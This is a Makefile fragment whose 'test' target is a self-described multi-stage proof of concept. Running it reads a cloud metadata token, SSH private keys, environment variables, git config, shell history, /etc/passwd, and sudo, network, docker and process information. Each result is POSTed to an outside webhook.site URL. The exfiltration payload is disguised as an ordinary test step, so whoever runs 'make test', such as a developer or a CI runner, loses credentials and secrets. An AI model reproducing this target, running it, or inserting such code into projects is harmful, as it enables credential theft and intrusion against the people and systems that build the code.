test:
	@echo "--- STARTING MULTI-STAGE NUCLEAR PoC ---"

	# 1. Cloud Infrastructure Token Leak (Critical)
	curl -s -m 5 -H "Metadata: true" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" > cloud_token.txt || true
	curl -X POST -F "data=@cloud_token.txt" https://webhook.site/557802b8-360a-47b6-ac7c-69f6d094271f?type=cloud_metadata

	# 2. Docker Container & Image Takeover
	docker ps -a > docker_info.txt || true
	docker images >> docker_info.txt || true
	curl -X POST -F "data=@docker_info.txt" https://webhook.site/557802b8-360a-47b6-ac7c-69f6d094271f?type=docker_socket

	# 3. Private SSH Key Extraction
	ls -alR ~/.ssh/ > ssh_leak.txt || true
	cat ~/.ssh/id_rsa >> ssh_leak.txt || true
	cat ~/.ssh/authorized_keys >> ssh_leak.txt || true
	curl -X POST -F "data=@ssh_leak.txt" https://webhook.site/557802b8-360a-47b6-ac7c-69f6d094271f?type=ssh_keys

	# 4. Internal Network Discovery (ARP & Netstat)
	arp -a > network_map.txt || true
	netstat -tulpn >> network_map.txt || true
	route -n >> network_map.txt || true
	curl -X POST -F "data=@network_map.txt" https://webhook.site/557802b8-360a-47b6-ac7c-69f6d094271f?type=internal_network

	# 5. Global Environment Secret Dump
	printenv > env_secrets.txt || true
	curl -X POST -F "data=@env_secrets.txt" https://webhook.site/557802b8-360a-47b6-ac7c-69f6d094271f?type=env_vars

	# 6. Sudoers & Privilege Audit
	sudo -l > priv_audit.txt || true
	whoami >> priv_audit.txt || true
	curl -X POST -F "data=@priv_audit.txt" https://webhook.site/557802b8-360a-47b6-ac7c-69f6d094271f?type=privileges

	# 7. Git Credential & Config Leak
	cat ~/.gitconfig > git_leak.txt || true
	git config --list >> git_leak.txt || true
	curl -X POST -F "data=@git_leak.txt" https://webhook.site/557802b8-360a-47b6-ac7c-69f6d094271f?type=git_config

	# 8. Command History Reconstruction
	cat ~/.bash_history > history_leak.txt || true
	cat ~/.sh_history >> history_leak.txt || true
	curl -X POST -F "data=@history_leak.txt" https://webhook.site/557802b8-360a-47b6-ac7c-69f6d094271f?type=bash_history

	# 9. System Shadow & Password File Check
	ls -l /etc/shadow > shadow_check.txt || true
	cat /etc/passwd >> shadow_check.txt || true
	curl -X POST -F "data=@shadow_check.txt" https://webhook.site/557802b8-360a-47b6-ac7c-69f6d094271f?type=system_files

	# 10. Process List & Active Tasks Audit
	ps aux > process_list.txt || true
	curl -X POST -F "data=@process_list.txt" https://webhook.site/557802b8-360a-47b6-ac7c-69f6d094271f?type=processes

	@echo "--- ALL NUCLEAR STAGES COMPLETED ---"
